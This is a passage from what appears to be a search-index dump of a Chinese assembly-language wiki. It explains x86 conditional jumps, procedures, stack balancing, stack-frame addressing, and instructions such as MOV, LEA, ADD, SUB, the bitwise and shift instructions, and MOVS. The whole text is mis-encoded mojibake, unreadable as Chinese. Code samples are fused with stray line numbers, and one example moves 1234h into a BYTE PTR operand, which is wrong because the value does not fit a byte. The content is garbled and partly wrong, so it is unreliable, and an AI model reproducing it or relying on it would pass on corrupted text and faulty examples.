JNAE ä¸å¤§äºæˆ–ç­‰äºè·³è½¬ï¼ˆä¸JBç›¸åŒï¼‰ JAE å¤§äºæˆ–ç­‰äºè·³è½¬ï¼ˆè‹¥leftOpâ‰¥rightOpï¼‰ JBE å°äºæˆ–ç­‰äºè·³è½¬ï¼ˆè‹¥leftOpâ‰¤rightOpï¼‰ JNB ä¸å°äºè·³è½¬ï¼ˆä¸JAEç›¸åŒï¼‰ JNA ä¸å¤§äºè·³è½¬ï¼ˆä¸JBEç›¸åŒï¼‰ æœ‰ç¬¦å·æ•°æ¯”è¾ƒ åŠ©è®°ç¬¦ è¯´æ˜ åŠ©è®°ç¬¦ è¯´æ˜ JG å¤§äºè·³è½¬ï¼ˆè‹¥leftOpï¼rightOpï¼‰ JL å°äºè·³è½¬ï¼ˆè‹¥leftOpï¼œrightOpï¼‰ JNLE ä¸å°äºæˆ–ç­‰äºè·³è½¬ï¼ˆä¸JGç›¸åŒï¼‰ JNGE ä¸å¤§äºæˆ–ç­‰äºè·³è½¬ï¼ˆä¸JLç›¸åŒï¼‰ JGE å¤§äºæˆ–ç­‰äºè·³è½¬ï¼ˆè‹¥leftOpâ‰¥rightOpï¼‰ JLE å°äºæˆ–ç­‰äºè·³è½¬ï¼ˆè‹¥leftOpâ‰¤rightOpï¼‰ JNL ä¸å°äºè·³è½¬ï¼ˆä¸JGEç›¸åŒï¼‰ JNG ä¸å¤§äºè·³è½¬ï¼ˆä¸JLEç›¸åŒï¼‰"},{"title":"è¿‡ç¨‹","path":"/wiki/Assembly_Language/è¿‡ç¨‹.html","content":"ç¼–ç¨‹è¯­è¨€ç”¨ä¸åŒçš„æœ¯è¯­æ¥æŒ‡ä»£å­ç¨‹åºã€‚ä¾‹å¦‚ï¼Œåœ¨Cå’ŒC++ä¸­ï¼Œå­ç¨‹åºè¢«ç§°ä¸ºå‡½æ•°ï¼ˆfunctionsï¼‰ã€‚åœ¨Javaä¸­ï¼Œè¢«ç§°ä¸ºæ–¹æ³•(methods)ã€‚åœ¨MASMä¸­ï¼Œåˆ™è¢«ç§°ä¸ºè¿‡ç¨‹ï¼ˆproceduresï¼‰ã€‚ å®šä¹‰ å‡½æ•°å°±æ˜¯ä¸€ç³»åˆ—æŒ‡ä»¤çš„é›†åˆï¼Œä¸ºäº†å®ŒæˆæŸä¸ªä¼šé‡å¤ä½¿ç”¨çš„ç‰¹å®šåŠŸèƒ½ã€‚ å¦‚æœä½¿ç”¨jmpæ¥è°ƒç”¨å‡½æ•°ï¼Œå‡è®¾åœ°å€Aå’Œåœ°å€Béƒ½è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œè°ƒç”¨å®Œåæ²¡æ³•è¿”å›åˆ°ç›¸åº”è°ƒç”¨è€…ä¸‹ä¸€è¡ŒæŒ‡ä»¤ï¼Œæ‰€ä»¥ç”¨callå’ŒretæŒ‡ä»¤æ¥è°ƒç”¨å‡½æ•°ï¼Œä»¥æ­¤å®ç°è°ƒç”¨å®Œè¿˜èƒ½å›åˆ°åŸæ¥çš„åœ°å€ç»§ç»­æ‰§è¡Œã€‚ å‚æ•° å¯„å­˜å™¨ä¼ å‚ å‡è®¾å†™å‡½æ•°æ—¶çº¦å®šå¥½è¿™ä¸ªå‡½æ•°ç”¨eaxã€ecxä½œä¸ºå…¥å£å‚æ•°ï¼Œç”¨eaxä½œä¸ºè¿”å›å€¼ å †æ ˆä¼ å‚ å¦‚æœä¼ é€’çš„å‚æ•°è¦ç‰¹åˆ«å¤šï¼Œè€Œå¯„å­˜å™¨æ•°é‡åˆæ˜¯æœ‰é™çš„ã€‚äºæ˜¯ç”¨å †æ ˆä¼ å‚ï¼Œåœ¨è°ƒç”¨å‡½æ•°å‰å°†å‚æ•°å‹å…¥å †æ ˆã€‚ å †æ ˆå¹³è¡¡ å †æ ˆå¹³è¡¡æŒ‡ä¸¤ä¸ªæ–¹é¢ å‡½æ•°è°ƒç”¨ç»“æŸï¼Œå‡†å¤‡æ‰§è¡ŒretæŒ‡ä»¤æ—¶ï¼ŒESPæŒ‡å‘çš„å†…å®¹éœ€æ˜¯è°ƒç”¨è¯¥å‡½æ•°æ—¶å‹å…¥çš„ä¸‹ä¸€è¡ŒæŒ‡ä»¤çš„åœ°å€ï¼Œå¦åˆ™å›ä¸å»äº†ï¼Œç¨‹åºä¼šå‡ºé”™ å¦‚æœé€šè¿‡å †æ ˆä¼ å‚ï¼Œå½“å‡½æ•°è°ƒç”¨å®Œæ¯•è¿”å›åï¼Œå †æ ˆé¡»ä¸è°ƒç”¨å‡½æ•°å‰ä¸€è‡´ã€‚ å…³äºç¬¬1ç‚¹ å‡½æ•°å†…éƒ¨ä½¿ç”¨äº†å †æ ˆä½†æ²¡å¹³è¡¡ï¼Œå¯¼è‡´retå¼¹æ ˆæ—¶eipè¢«èµ‹é”™å€¼ã€‚ å…³äºç¬¬2ç‚¹ ä¾‹å¦‚ä¸‹è¯­å¥åœ¨mainä¸­è°ƒç”¨AddTwoï¼š 123push 6push 5call AddTwo è°ƒç”¨ç»“æŸè¿”å›åï¼ŒAddTwoæœ‰ä¸¤ä¸ªå‚æ•°ç•™åœ¨å †æ ˆä¸­ï¼Œä¸‹å›¾ä¸ºè°ƒç”¨è¿”å›åçš„å †æ ˆã€‚è¿™ä¸¤ä¸ªå€¼å·²ç»æ²¡ç”¨åˆ°äº†ï¼Œå¿…é¡»å°†å‚æ•°ä»å †æ ˆä¸­åˆ é™¤ï¼Œåœ¨è¿™é‡Œä¼šç™½ç™½å ç”¨å †æ ˆç©ºé—´ã€‚å¤šæ¬¡è°ƒç”¨å‡½æ•°åï¼Œè¿™äº›å·²ç»æ²¡ç”¨çš„åƒåœ¾æ•°å€¼ä¼šå ç”¨å †æ ˆçš„ç©ºé—´ï¼Œå¯¼è‡´å †æ ˆç©ºé—´æº¢å‡ºã€‚ å¤–å¹³æ ˆ åœ¨callæŒ‡ä»¤å¤–ä½¿ç”¨addæŒ‡ä»¤å¹³è¡¡å †æ ˆ å†…å¹³æ ˆ ç»™RETæŒ‡ä»¤æ·»åŠ ä¸€ä¸ªæ•´æ•°å‚æ•°ï¼Œä½¿å¾—ç¨‹åºåœ¨è¿”å›åˆ°è°ƒç”¨è¿‡ç¨‹æ—¶ï¼ŒESPä¼šåŠ ä¸Šæ•°å€¼8ã€‚ å°ç»“ å¯¹äºç¬¬ä¸€ç§æƒ…å†µæˆ‘ä»¬å¯ä»¥åœ¨å‡½æ•°å†…ä½¿ç”¨å®Œå †æ ˆåï¼ŒPOPé‡Šæ”¾æ•°æ®ï¼›å¯¹äºç¬¬äºŒç§å †æ ˆä¼ å‚å¯¼è‡´çš„å †æ ˆä¸å¹³è¡¡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤–å¹³æ ˆã€å†…å¹³æ ˆä¸¤ç§æ–¹æ³•ã€‚ å †æ ˆå¯»å€ ESPå¯»å€ ä½¿ç”¨ESPå¯»å€ï¼Œå½¢å¦‚ 1mov eax, dword ptr ss:[esp+4] ç¼ºç‚¹ï¼šå½“å‡½æ•°å†…éƒ¨ä¹Ÿä½¿ç”¨åˆ°å †æ ˆæ—¶ï¼Œå› ä¸ºespå˜äº†ï¼Œä¸ºäº†å¯»åˆ°åŒä¸€å—å †æ ˆåœ°å€ï¼Œesp+çš„åç§»è¦è®¡ç®—ï¼Œæ¯”è¾ƒéº»çƒ¦ã€‚ EBPå¯»å€ å †æ ˆå¸§ï¼ˆstack frame)(æˆ–æ´»åŠ¨è®°å½•ï¼ˆactivation record)ï¼‰æ˜¯ä¸€å—å †æ ˆä¿ç•™åŒºåŸŸï¼Œç”¨äºå­˜æ”¾è¢«ä¼ é€’çš„å®é™…å‚æ•°ã€å­ç¨‹åºçš„è¿”å›å€¼ã€å±€éƒ¨å˜é‡ä»¥åŠè¢«ä¿å­˜çš„å¯„å­˜å™¨ã€‚å †æ ˆå¸§çš„åˆ›å»ºæ­¥éª¤å¦‚ä¸‹æ‰€ç¤º: è¢«ä¼ é€’çš„å®é™…å‚æ•°ã€‚å¦‚æœæœ‰ï¼Œåˆ™å‹å…¥å †æ ˆã€‚ å½“å­ç¨‹åºè¢«è°ƒç”¨æ—¶ï¼Œä½¿è¯¥å­ç¨‹åºçš„è¿”å›å€¼å‹å…¥å †æ ˆã€‚ å­ç¨‹åºå¼€å§‹æ‰§è¡Œæ—¶ï¼ŒEBPè¢«å‹å…¥å †æ ˆã€‚ è®¾ç½®EBPç­‰äºESPã€‚ä»è¿™æ—¶å¼€å§‹,EBPå°±å˜æˆäº†è¯¥å­ç¨‹åºæ‰€æœ‰å‚æ•°çš„å¼•ç”¨åŸºå€ã€‚ å¦‚æœæœ‰å±€éƒ¨å˜é‡ï¼Œä¿®æ”¹ESPä»¥ä¾¿åœ¨å †æ ˆä¸­ä¸ºè¿™äº›å˜é‡é¢„ç•™ç©ºé—´ã€‚ å¦‚æœéœ€è¦ä¿å­˜å¯„å­˜å™¨ï¼Œå°±å°†å®ƒä»¬å‹å…¥å †æ ˆã€‚ 1234567891011push ebpmov ebp,esp;push a ;å¦‚æœæœ‰è¦ä¿å­˜çš„å¯„å­˜å™¨;push bxxx ;å‡½æ•°å†…éƒ¨xxx ;å‡½æ•°å†…éƒ¨;pop b ;retå‰è®°å¾—å¹³è¡¡å †æ ˆ;pop amov esp,ebppop ebpretn åœ¨æ•´ä¸ªå‡½æ•°è¿‡ç¨‹ä¸­ï¼Œebpçš„ä½ç½®ä¸å˜ï¼Œä¸€ç›´æŒ‡ç¤ºç€æ ˆå¸§çš„åº•éƒ¨ï¼Œä½¿ç”¨[ebp+åç§»]çš„æ–¹å¼å¯¹å‚æ•°è¿›è¡Œå¯»å€ã€‚"},{"title":"æ±‡ç¼–æŒ‡ä»¤","path":"/wiki/Assembly_Language/æ±‡ç¼–æŒ‡ä»¤.html","content":"æ±‡ç¼–æŒ‡ä»¤ æŒ‡ä»¤æ“ä½œæ•°ç¬¦å· ç™½çš®ä¹¦äºŒå·P115é¡µ3.1.1.3 æ“ä½œæ•° è¯´æ˜ reg é€šç”¨å¯„å­˜å™¨ m å†…å­˜ imm ç«‹å³æ•° r8 8ä½é€šç”¨å¯„å­˜å™¨ m8 8ä½å†…å­˜æ“ä½œæ•° imm8 8ä½ç«‹å³æ•° ä»¥æ­¤ç±»æ¨ MOV å°†æºæ“ä½œæ•°å¤åˆ¶åˆ°ç›®æ ‡æ“ä½œæ•°ï¼›æºæ“ä½œæ•°ä¸ä¼šå‘ç”Ÿæ”¹å˜ 1mov destination,source æ“ä½œæ•° 12345MOV reg,regMOV mem,regMOV reg,memMOV mem,immMOV reg,imm ä¸¤ä¸ªæ“ä½œæ•°çš„å®½åº¦å¿…é¡»åŒç­‰å¤§å° ä¸¤ä¸ªæ“ä½œæ•°ä¸èƒ½åŒæ—¶ä¸ºå†…å­˜æ“ä½œæ•° æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼ˆIPã€EIPæˆ–RIPï¼‰ä¸èƒ½ä½œä¸ºç›®çš„æ“ä½œæ•° XCHG XCHG(äº¤æ¢æ•°æ®)æŒ‡ä»¤äº¤æ¢ä¸¤ä¸ªæ“ä½œæ•°å†…å®¹ã€‚ 123XCHG reg,regXCHG reg,memXCHG mem,reg ä¾‹ 123XCHG AL,CLXCHG DWORD PTR DS:[12FFC4],EAXXCHG BYTE PTR DS:[12FFC4],AL OFFSETè¿ç®—ç¬¦ ã€Šæ±‡ç¼–è¯­è¨€-åŸºäºx86å¤„ç†å™¨ç¬¬ä¸ƒç‰ˆã€‹P87 OFFSETè¿ç®—ç¬¦è¿”å›æ•°æ®æ ‡å·çš„åç§»é‡ã€‚è¿™ä¸ªåç§»é‡æŒ‰å­—èŠ‚è®¡ç®—ï¼Œè¡¨ç¤ºçš„æ˜¯è¯¥æ•°æ®æ ‡å·è·ç¦»æ•°æ®æ®µèµ·å§‹åœ°å€çš„è·ç¦»ã€‚ å¦‚ä¸‹å›¾æ‰€ç¤ºä¸ºæ•°æ®æ®µå†…åä¸ºmyByteçš„å˜é‡ã€‚ ç¤ºä¾‹ 12345.databVal BYTE ?wVal WORD ?dVal DWORD ?dVal2 DWORD ? å‡è®¾bValåœ¨åç§»é‡ä¸º0040 4000(åå…­è¿›åˆ¶)çš„ä½ç½®ï¼Œåˆ™OFFSETè¿ç®—ç¬¦è¿”å›å€¼å¦‚ä¸‹: 12345 åç§»mov esi,OFFSET bVal ;ESI =00404000h 0mov esi,OFFSET wVal ;ESI =00404001h BYTEmov esi,OFFSET dVal ;ESI =00404003h BYTE+WORDmov esi,OFFSET dVal2 ;ESI =00404007h BYTE+WORD+DWORD LEAæŒ‡ä»¤ ã€Šæ±‡ç¼–è¯­è¨€-åŸºäºx86å¤„ç†å™¨ç¬¬ä¸ƒç‰ˆã€‹P236 LEAæŒ‡ä»¤è¿”å›é—´æ¥æ“ä½œæ•°çš„åœ°å€ã€‚ç”±äºé—´æ¥æ“ä½œæ•°ä¸­åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªå¯„å­˜å™¨ï¼Œå› æ­¤ä¼šåœ¨è¿è¡Œæ—¶è®¡ç®—è¿™äº›æ“ä½œæ•°çš„åç§»é‡ã€‚ ä¸ºäº†æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨LEAï¼Œç°åœ¨æ¥çœ‹ä¸‹é¢çš„C++ç¨‹åº,è¯¥ç¨‹åºå£°æ˜äº†ä¸€ä¸ªå±€éƒ¨æ•°ç»„ myStringï¼Œå¹¶å¼•ç”¨å®ƒæ¥åˆ†é…æ•°ç»„å€¼: 123456void makeArray()&#123; char myString[30]; for(int i=0;i&lt;30;i++) myString[i]=&#x27;*&#x27;;&#125; ä¸ä¹‹ç­‰æ•ˆçš„æ±‡ç¼–ä»£ç åœ¨å †æ ˆä¸­ä¸ºmyStringåˆ†é…ç©ºé—´ï¼Œå¹¶å°†åœ°å€â€”â€”é—´æ¥æ“ä½œæ•°â€”â€”èµ‹ç»™ESIã€‚è™½ç„¶æ•°ç»„åªæœ‰30ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯ESPè¿˜æ˜¯é€’å‡äº†32ä»¥å¯¹é½åŒå­—è¾¹ç•Œã€‚æ³¨æ„å¦‚ä½•ä½¿ç”¨LEAæŠŠæ•°ç»„åœ°å€åˆ†é…ç»™ESI: 12345678910111213makeArray PROC push ebp mov ebp,esp sub esp,32 ;myStringä½äºEBP-30çš„ä½ç½® lea esi,[ebp-30] ;åŠ è½½myStringçš„åœ°å€ mov ecx,30 ;å¾ªç¯è®¡æ•°å™¨L1: mov BYTE PTR [esi],&#x27;*&#x27; ;å¡«å……ä¸€ä¸ªä½ç½® inc esi ;æŒ‡å‘ä¸‹ä¸€ä¸ªå…ƒç´  loop L1 ;å¾ªç¯ï¼Œç›´åˆ°ECX=0 add esp,32 ;åˆ é™¤æ•°ç»„ï¼ˆæ¢å¤ESPï¼‰ pop ebp retmakeArray ENDP ä¸OFFSETè¿ç®—ç¬¦çš„åŒºåˆ« ä¸èƒ½ç”¨OFFSETè·å¾—å †æ ˆå‚æ•°çš„åœ°å€ï¼Œå› ä¸ºOFFSETåªé€‚ç”¨äºç¼–è¯‘æ—¶å·²çŸ¥çš„åœ°å€ã€‚ä¸‹é¢çš„è¯­å¥æ— æ³•æ±‡ç¼–: 1mov esi,OFFSET [ebp-30] ;é”™è¯¯ ADD å°†æºæ“ä½œæ•°ä¸ç›®æ ‡æ“ä½œæ•°ç›¸åŠ ä¹‹å’Œï¼Œå­˜å…¥ç›®æ ‡æ“ä½œæ•°ï¼›æºæ“ä½œæ•°ä¸ä¼šå‘ç”Ÿæ”¹å˜ 1add destination,source æ“ä½œæ•° 1234567891011ADD r/m8, imm8ADD r/m16,imm16ADD r/m32,imm32ADD r/m16, imm8ADD r/m32, imm8ADD r/m8, r8ADD r/m16, r16ADD r/m32, r32ADD r8, r/m8ADD r16, r/m16ADD r32, r/m32 æ ‡å¿—ä½ å½±å“è¿›ä½æ ‡å¿—ä½ã€é›¶æ ‡å¿—ä½ã€ç¬¦å·æ ‡å¿—ä½ã€æº¢å‡ºæ ‡å¿—ä½ã€è¾…åŠ©è¿›ä½æ ‡å¿—ä½ã€å¥‡å¶æ ‡å¿—ä½ï¼Œæ ¹æ®å­˜å…¥ç›®æ ‡æ“ä½œæ•°çš„æ•°å€¼è¿›è¡Œå˜åŒ– ADC ADC(å¸¦è¿›ä½åŠ æ³•)æŒ‡ä»¤å°†æºæ“ä½œæ•°å’Œè¿›ä½æ ‡å¿—ä½çš„å€¼éƒ½ä¸ç›®çš„æ“ä½œæ•°ç›¸åŠ ã€‚ åŠŸèƒ½ï¼šæ“ä½œå¯¹è±¡1=æ“ä½œå¯¹è±¡1+æ“ä½œå¯¹è±¡2+CF 12345ADC reg,regADC mem,regADC reg,memADC mem,immADC reg,imm ä¾‹ 1ADC AL,CL 1ADC BYTE PTR DS:[12FFC4],2 1ADC BYTE PTR DS:[12FFC4],AL SUB ç›®æ ‡æ“ä½œæ•°å‡å»æºæ“ä½œæ•°ï¼Œç»“æœå­˜å…¥ç›®æ ‡æ“ä½œæ•°ï¼›æºæ“ä½œæ•°ä¸ä¼šå‘ç”Ÿæ”¹å˜ 1sub destination,source æ“ä½œæ•° 1234567891011SUB r/m8, imm8SUB r/m16,imm16SUB r/m32,imm32SUB r/m16, imm8SUB r/m32, imm8SUB r/m8, r8SUB r/m16, r16SUB r/m32, r32SUB r8, r/m8SUB r16, r/m16SUB r32, r/m32 æ ‡å¿—ä½ å½±å“è¿›ä½æ ‡å¿—ä½ã€é›¶æ ‡å¿—ä½ã€ç¬¦å·æ ‡å¿—ä½ã€æº¢å‡ºæ ‡å¿—ä½ã€è¾…åŠ©è¿›ä½æ ‡å¿—ä½ã€å¥‡å¶æ ‡å¿—ä½ï¼Œæ ¹æ®å­˜å…¥ç›®æ ‡æ“ä½œæ•°çš„æ•°å€¼è¿›è¡Œå˜åŒ– SBB SBB(å¸¦å€Ÿä½å‡æ³•ï¼‰æŒ‡ä»¤ä»ç›®çš„æ“ä½œæ•°ä¸­å‡å»æºæ“ä½œæ•°å’Œè¿›ä½æ ‡å¿—ä½çš„å€¼ã€‚å…è®¸ä½¿ç”¨çš„æ“ä½œæ•°ä¸ADCæŒ‡ä»¤ç›¸åŒã€‚ åŠŸèƒ½ï¼šæ“ä½œå¯¹è±¡1=æ“ä½œå¯¹è±¡1-æ“ä½œå¯¹è±¡2-CF ä¾‹ 1SBB AL,CL 1SBB BYTE PTR DS:[12FFC4],2 1SBB BYTE PTR DS:[12FFC4],AL PTRè¿ç®—ç¬¦ ç±»å‹è½¬æ¢è¿ç®—ç¬¦ï¼Œç”¨äºæŒ‡å®šæ“ä½œæ•°çš„å¤§å°æˆ–ç±»å‹ã€‚PTRè¿ç®—ç¬¦å¯ä»¥ç”¨äºå¼ºåˆ¶å°†ä¸€ä¸ªæ“ä½œæ•°è§£é‡Šä¸ºç‰¹å®šç±»å‹çš„æŒ‡é’ˆï¼Œè¿™æ ·å¯ä»¥ç¡®ä¿æ­£ç¡®çš„å†…å­˜å¤§å°è¢«è®¿é—®ã€‚ ç”¨é€”ä¸€ ç”¨æ¥é‡å†™ä¸€ä¸ªå·²ç»è¢«å£°æ˜è¿‡çš„æ“ä½œæ•°çš„å¤§å°ç±»å‹ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾æƒ³è¦å°†ä¸€ä¸ªåŒå­—å˜é‡myDoubleçš„ä½16ä½ä¼ é€ç»™AXã€‚ç”±äºæ“ä½œæ•°å¤§å°ä¸åŒ¹é…ï¼Œå› æ­¤ï¼Œæ±‡ç¼–å™¨ä¸ä¼šå…è®¸è¿™ç§æ“ä½œ: 12345.datamyDouble DWORD 12345678h.codemov ax,myDouble ä½†æ˜¯,ä½¿ç”¨WORD PTRè¿ç®—ç¬¦å°±èƒ½å°†ä½ä½å­—ï¼ˆ5678h)é€å…¥AX: 1mov ax,WORD PTR myDouble ç”¨é€”äºŒ ä¸€ä¸ªæ“ä½œæ•°çš„å¤§å°å¯èƒ½æ— æ³•ä»æŒ‡ä»¤ä¸­ç›´æ¥çœ‹å‡ºæ¥ï¼Œè¦ç”¨PTRè¿ç®—ç¬¦ç¡®è®¤æ“ä½œæ•°çš„å¤§å°ç±»å‹ã€‚ æ¯”å¦‚ï¼Œåœ¨å‘å†…å­˜ä¼ ç«‹å³æ•°æ—¶ï¼Œè¦ç”¨PTRå£°æ˜ç”¨å¤šå¤§çš„å†…å­˜ 1mov BYTE PTR ds:[0x12345678],1234h PTRå¿…é¡»ä¸ä¸€ä¸ªæ ‡å‡†æ±‡ç¼–æ•°æ®ç±»å‹ä¸€èµ·ä½¿ç”¨ï¼Œè¿™äº›ç±»å‹åŒ…æ‹¬ï¼šBYTEã€SBYTEã€WORDã€SWORDã€DWORDã€SDWORDã€FWORDã€QWORDæˆ–TBYTE ä½è¿ç®—æŒ‡ä»¤ AND ä¸¤ä¸ªæ“ä½œæ•°çš„å¯¹åº”ä½ä¹‹é—´è¿›è¡Œï¼ˆæŒ‰ä½ï¼‰é€»è¾‘ä¸ï¼ˆANDï¼‰æ“ä½œï¼Œç»“æœå­˜æ”¾åœ¨ç›®æ ‡æ“ä½œæ•°ä¸­ï¼›æºæ“ä½œæ•°ä¸ä¼šå‘ç”Ÿæ”¹å˜ 1and destination,source æ“ä½œæ•° 12345AND reg,regAND reg,memAND reg,immAND mem,regAND mem,imm ä¸¤ä¸ªæ“ä½œæ•°å¿…é¡»åŒç­‰å¤§å° æ ‡å¿—ä½ æ€»æ˜¯æ¸…é™¤æº¢å‡ºå’Œè¿›ä½è¿›ä½æ ‡å¿—ä½ï¼Œå¹¶æ ¹æ®ç›®æ ‡æ“ä½œæ•°çš„å€¼æ¥ä¿®æ”¹ç¬¦å·æ ‡å¿—ä½ã€é›¶æ ‡å¿—ä½ã€å¥‡å¶æ ‡å¿—ä½ã€‚ OR ä¸¤ä¸ªæ“ä½œæ•°çš„å¯¹åº”ä½ä¹‹é—´è¿›è¡Œï¼ˆæŒ‰ä½ï¼‰é€»è¾‘æˆ–ï¼ˆORï¼‰æ“ä½œï¼Œç»“æœå­˜æ”¾åœ¨ç›®æ ‡æ“ä½œæ•°ä¸­ï¼›æºæ“ä½œæ•°ä¸ä¼šå‘ç”Ÿæ”¹å˜ 1or destination,source æ“ä½œæ•° 12345OR reg,regOR reg,memOR reg,immOR mem,regOR mem,imm ä¸¤ä¸ªæ“ä½œæ•°å¿…é¡»åŒç­‰å¤§å° æ ‡å¿—ä½ æ€»æ˜¯æ¸…é™¤æº¢å‡ºå’Œè¿›ä½è¿›ä½æ ‡å¿—ä½ï¼Œå¹¶æ ¹æ®ç›®æ ‡æ“ä½œæ•°çš„å€¼æ¥ä¿®æ”¹ç¬¦å·æ ‡å¿—ä½ã€é›¶æ ‡å¿—ä½ã€å¥‡å¶æ ‡å¿—ä½ã€‚ XOR ä¸¤ä¸ªæ“ä½œæ•°çš„å¯¹åº”ä½ä¹‹é—´è¿›è¡Œï¼ˆæŒ‰ä½ï¼‰é€»è¾‘å¼‚æˆ–ï¼ˆXORï¼‰æ“ä½œï¼Œç»“æœå­˜æ”¾åœ¨ç›®æ ‡æ“ä½œæ•°ä¸­ï¼›æºæ“ä½œæ•°ä¸ä¼šå‘ç”Ÿæ”¹å˜ 1xor destination,source æ“ä½œæ•° 12345XOR reg,regXOR reg,memXOR reg,immXOR mem,regXOR mem,imm ä¸¤ä¸ªæ“ä½œæ•°å¿…é¡»åŒç­‰å¤§å° æ ‡å¿—ä½ æ€»æ˜¯æ¸…é™¤æº¢å‡ºå’Œè¿›ä½è¿›ä½æ ‡å¿—ä½ï¼Œå¹¶æ ¹æ®ç›®æ ‡æ“ä½œæ•°çš„å€¼æ¥ä¿®æ”¹ç¬¦å·æ ‡å¿—ä½ã€é›¶æ ‡å¿—ä½ã€å¥‡å¶æ ‡å¿—ä½ã€‚ NOT ç¿»è½¬æ“ä½œæ•°ä¸­çš„æ‰€æœ‰ä½ã€‚ æ“ä½œæ•° 12NOT regNOT mem æ ‡å¿—ä½ ä¸å½±å“æ ‡å¿—ä½ã€‚ ç§»ä½æŒ‡ä»¤ æŒ‡ä»¤ å«ä¹‰ SHL å·¦ç§» Shift Left SHR å³ç§» Shift Right SAL ç®—æ•°å·¦ç§» Shift Arithmetic Left SAR ç®—æ•°å³ç§» Shift Arithmetic Right ROL å¾ªç¯å·¦ç§» Rotate Left ROR å¾ªç¯å³ç§» Rotate Right RCL å¸¦è¿›ä½çš„å¾ªç¯å·¦ç§» Rotate through Carry Left RCR å¸¦è¿›ä½çš„å¾ªç¯å³ç§» Rotate through Carry Right SHL SHL(å·¦ç§»)æŒ‡ä»¤ä½¿ç›®çš„æ“ä½œæ•°é€»è¾‘å·¦ç§»ä¸€ä½ï¼Œæœ€ä½ä½ç”¨0å¡«å……ã€‚æœ€é«˜ä½ç§»å…¥è¿›ä½æ ‡å¿—ä½,è€Œè¿›ä½æ ‡å¿—ä½ä¸­åŸæ¥çš„æ•°å€¼è¢«ä¸¢å¼ƒ: SHLçš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯ç›®çš„æ“ä½œæ•°,ç¬¬äºŒä¸ªæ“ä½œæ•°æ˜¯ç§»ä½æ¬¡æ•°: 1SHL destination,count è¯¥æŒ‡ä»¤å¯ç”¨çš„æ“ä½œæ•°ç±»å‹å¦‚ä¸‹æ‰€ç¤ºï¼š 1234SHL reg,imm8SHL mem, imm8SHL reg, CLSHL mem, CL x86å¤„ç†å™¨å…è®¸imm8ä¸º0ï½255ä¸­çš„ä»»ä½•æ•´æ•°ã€‚å¦å¤–ï¼ŒCLå¯„å­˜å™¨åŒ…å«çš„æ˜¯ç§»ä½è®¡æ•°ã€‚ä¸Šè¿°æ ¼å¼åŒæ ·é€‚ç”¨äºSHRã€SALã€SARã€RORã€ROLã€RCRå’ŒRCLæŒ‡ä»¤ã€‚ SHR SHRï¼ˆå³ç§»)æŒ‡ä»¤ä½¿ç›®çš„æ“ä½œæ•°é€»è¾‘å³ç§»ä¸€ä½ï¼Œæœ€é«˜ä½ç”¨0å¡«å……ã€‚æœ€ä½ä½å¤åˆ¶åˆ°è¿›ä½æ ‡å¿—ä½,è€Œè¿›ä½æ ‡å¿—ä½ä¸­åŸæ¥çš„æ•°å€¼è¢«ä¸¢å¼ƒ: SAL SAL(ç®—æœ¯å·¦ç§»ï¼‰æŒ‡ä»¤çš„æ“ä½œä¸SHLæŒ‡ä»¤ä¸€æ ·ã€‚æ¯æ¬¡ç§»åŠ¨æ—¶ï¼ŒSALéƒ½å°†ç›®çš„æ“ä½œæ•°ä¸­çš„æ¯ä¸€ä½ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªæœ€é«˜ä½ä¸Šã€‚æœ€ä½ä½ç”¨0å¡«å……;æœ€é«˜ä½ç§»å…¥è¿›ä½æ ‡å¿—ä½ï¼Œè¯¥æ ‡å¿—ä½åŸæ¥çš„å€¼è¢«ä¸¢å¼ƒ: å¯¹äºæœ‰ç¬¦å·æ•°æˆ–æ— ç¬¦å·æ•°ï¼Œç”¨SALæˆ–SHLæŒ‡ä»¤å…¶å®ä¸€æ ·çš„ï¼Œéƒ½æ˜¯ä½ä½è¡¥0ï¼Œæœ€é«˜ä½ç§»åˆ°CFã€‚ SAR SARï¼ˆç®—æœ¯å³ç§»)æŒ‡ä»¤å°†ç›®çš„æ“ä½œæ•°è¿›è¡Œç®—æœ¯å³ç§»: ROL ROL(å¾ªç¯å·¦ç§»ï¼‰æŒ‡ä»¤æŠŠæ‰€æœ‰ä½éƒ½å‘å·¦ç§»ã€‚æœ€é«˜ä½å¤åˆ¶åˆ°è¿›ä½æ ‡å¿—ä½å’Œæœ€ä½ä½ã€‚æŒ‡ä»¤æ ¼å¼ä¸SHLæŒ‡ä»¤ç›¸åŒ: ROR ROR(å¾ªç¯å³ç§»)æŒ‡ä»¤æŠŠæ‰€æœ‰ä½éƒ½å‘å³ç§»ï¼Œæœ€ä½ä½å¤åˆ¶åˆ°è¿›ä½æ ‡å¿—ä½å’Œæœ€é«˜ä½ã€‚è¯¥æŒ‡ä»¤æ ¼å¼ä¸SHLæŒ‡ä»¤ç›¸åŒ: RCL RCL(å¸¦è¿›ä½å¾ªç¯å·¦ç§»ï¼‰æŒ‡ä»¤æŠŠæ¯ä¸€ä½éƒ½å‘å·¦ç§»ï¼Œè¿›ä½æ ‡å¿—ä½å¤åˆ¶åˆ°LSBï¼Œè€ŒMSBå¤åˆ¶åˆ°è¿›ä½æ ‡å¿—ä½: RCR RCR(å¸¦è¿›ä½å¾ªç¯å³ç§»ï¼‰æŒ‡ä»¤æŠŠæ¯ä¸€ä½éƒ½å‘å³ç§»ï¼Œè¿›ä½æ ‡å¿—ä½å¤åˆ¶åˆ°MSB,è€ŒLSBå¤åˆ¶åˆ°è¿›ä½æ ‡å¿—ä½: å­—ç¬¦ä¸²æ“ä½œæŒ‡ä»¤ MOVSæŒ‡ä»¤ ä¼ é€å­—ç¬¦ä¸²æ•°æ®ï¼šå°†ESIæŒ‡å‘çš„å†…å­˜ä½ç½®å¤åˆ¶åˆ°EDIæŒ‡å‘çš„å†…å­˜ä½ç½®ã€‚ESIå’ŒEDIè‡ªå¢æˆ–è‡ªå‡ï¼Œç”±æ–¹å‘æ ‡å¿—ä½çš„å€¼å†³å®šã€‚å¯ä½¿ç”¨é‡å¤å‰ç¼€ã€‚ æŒ‡ä»¤ å®Œæ•´å½¢å¼ å«ä¹‰ ESIå’ŒEDIå¢åŠ æˆ–å‡å°‘çš„æ•°å€¼ MOVSB MOVS BYTE PTR ES:[EDI], 